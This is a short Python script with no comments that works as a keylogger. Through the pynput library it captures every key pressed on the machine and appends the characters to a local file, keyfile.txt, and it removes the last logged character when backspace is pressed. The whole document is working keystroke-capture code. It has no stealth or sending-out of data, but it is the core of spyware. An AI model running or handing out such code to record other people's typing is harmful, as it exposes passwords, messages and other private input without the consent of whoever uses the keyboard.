from pynput import keyboard

def updateContent():
    with open("keyfile.txt", 'r+') as file:
        content = file.read()
        updateContent = content[:-1]
        file.seek(0)
        file.write(updateContent)
        file.truncate()

def KeyPressed(key):
    with open("keyfile.txt", 'a') as values:
        try:
            char = key.char
            values.write(char)
        except:
            val = str(key)
            if val == "Key.backspace":
                updateContent()
            elif val == "aKey.backspace":
                updateContent()
            else:
                values.write(" ")
            


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=KeyPressed)
    listener.start()
    input()